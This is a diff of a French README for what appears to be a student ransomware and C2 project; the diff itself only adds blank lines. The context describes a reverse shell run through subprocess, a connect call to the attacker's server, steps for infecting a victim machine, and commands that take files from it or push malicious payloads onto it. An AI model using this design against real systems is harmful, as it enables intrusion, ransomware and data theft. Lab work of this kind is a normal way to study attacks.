@@ -54,6 +54,7 @@ Pour garantir l'intégrité des fichiers lors du transfert, un protocole en troi
 D. Reverse Shell Interactif
 
 Toute commande non reconnue comme une commande interne (ex: ls, whoami, cat) est transmise au système via subprocess.check_output. Le résultat de la commande est ensuite renvoyé au serveur pour affichage.
+
 4. Bonus : Journalisation et Analyse (Logs)
 
 Conformément aux exigences de la Partie 2 du sujet, un système de logs complet a été intégré :
@@ -82,6 +83,7 @@ Par défaut, le malware cherche le serveur sur 127.0.0.1 (votre propre machine).
 
     s.connect(("ADRESSE_IP_DU_SERVEUR", 8888))
 
+
 Étape 1 : Lancement du Serveur (Attaquant)
 
 Ouvrez un terminal sur la machine de l'attaquant et lancez le script :
@@ -90,6 +92,7 @@ Bash
 python3 c2_server.py
 
 Le serveur se met en écoute : [*] SERVEUR C2 PRET - En attente de connexion...
+
 Étape 2 : Infection de la Cible (Victime)
 
 Ouvrez un terminal sur la machine victime et lancez le malware :
@@ -98,6 +101,7 @@ Bash
 python3 ransomware_client.py
 
 Dès l'exécution, le serveur reçoit les informations d'identification (UUID et Clé XOR).
+
 Étape 3 : Interaction et Contrôle
 
 Une fois la connexion établie, le serveur affiche le menu d'aide. Vous pouvez alors piloter la victime avec les commandes suivantes :
@@ -113,6 +117,7 @@ Une fois la connexion établie, le serveur affiche le menu d'aide. Vous pouvez a
     Exfiltration : Tapez GET Documents/secret.txt pour copier un fichier de la victime vers votre machine d'attaquant.
 
     Infiltration : Tapez SEND payload.sh pour envoyer un nouveau fichier malveillant sur la machine victime.
+
 
 6. Analyse des Limites
 
